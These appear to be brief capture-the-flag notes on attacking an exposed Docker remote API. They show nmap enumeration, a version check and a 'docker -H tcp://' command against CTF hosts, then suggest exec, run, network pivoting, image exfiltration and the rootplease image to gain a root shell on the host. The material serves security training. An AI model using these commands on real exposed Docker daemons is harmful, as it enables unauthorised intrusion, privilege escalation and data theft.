[[Docker]]
Enumerate
```
nmap -sV -p- http://honksay.ctf.maplebacon.org/
```

Confirming vulnerability:
```
curl https://jwtdecoder.sstf.site:3000/version
```

Execute:
```
docker -H tcp://jwtdecoder.sstf.site:3000 ps
```

6.4.4. Experiment  
Of course, listing the running containers is the least that we can do at this stage. We can start to create our own, extract their filesystems and look for data, or execute commands on the host itself. Here are a few docker commands that I'll leave for you to experiment with:
```

Command:
network ls  

Description: 
Used to list the networks of containers, we could use this to discover other applications running and pivot to them from our machine!  

  
Command:
images  

Description: 
List images used by containers, data can also be exfiltrated by reverse-engineering the image.  

  
Command:
exec  

Description:
Execute a command on a container  

  
Command:
run  

Description:
Run a container  

 ```

Experiment with some [Docker commands](https://raw.githubusercontent.com/sangam14/dockercheatsheets/master/dockercheatsheet8.png) to enumerate the machine, try to gain a shell onto some of the containers and take a look at using tools such as [rootplease](https://registry.hub.docker.com/r/chrisfosterelli/rootplease) to use Docker to create a root shell on the device itself.